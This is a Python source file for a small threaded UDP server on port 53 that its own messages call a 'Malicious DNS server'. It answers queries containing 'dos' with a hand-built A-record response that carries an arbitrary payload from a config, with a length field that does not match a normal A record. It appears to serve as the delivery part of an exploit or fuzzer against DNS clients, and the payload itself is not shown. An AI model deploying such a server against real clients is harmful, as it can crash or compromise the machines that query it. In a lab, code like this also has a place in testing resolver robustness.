# simple_dns.py
import socket
import threading

class DNSServer(threading.Thread):
    def __init__(self, payload_config):
        super().__init__()
        self.daemon = True  # Thread will exit when the main program exits
        self.payload_config = payload_config
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('0.0.0.0', 53))

    def run(self):
        print("[DNS SERVER] Malicious DNS server started and listening on port 53.")
        while True:
            try:
                data, addr = self.sock.recvfrom(1024)
                # Check if the query is for our target domain
                if b'dos' in data:
                    print(f"[DNS SERVER] Received dos.com query from {addr}. Sending malicious payload.")
                    
                    # Craft the response packet header
                    transaction_id = data[:2]
                    flags = b'\x81\x80'  # Standard response flags
                    questions = b'\x00\x01' # 1 question
                    answers = b'\x00\x01' # 1 answer
                    auth_rr = b'\x00\x00'
                    add_rr = b'\x00\x00'
                    
                    # The qname from the original query
                    q_name_and_type = data[12:]
                    
                    # Pointer to the qname in the original query
                    pointer = b'\xc0\x0c'
                    
                    # Answer section
                    answer_type = b'\x00\x01'  # A Record
                    answer_class = b'\x00\x01' # IN
                    answer_ttl = b'\x00\x00\x00\xff' # Time to live
                    
                    # Get the current payload from the shared config
                    payload = self.payload_config['payload']
                    answer_rdlength = len(payload).to_bytes(2, 'big')

                    # Assemble the full packet
                    packet = (
                        transaction_id + flags + questions + answers + auth_rr + add_rr +
                        q_name_and_type + 
                        pointer + answer_type + answer_class + answer_ttl + 
                        answer_rdlength + payload
                    )
                    
                    self.sock.sendto(packet, addr)
                else:
                    print(f"[DNS SERVER] Received non-target query. Ignoring.")

            except Exception as e:
                print(f"[DNS SERVER] Error: {e}")
                break
        self.sock.close()
        print("[DNS SERVER] Shut down.")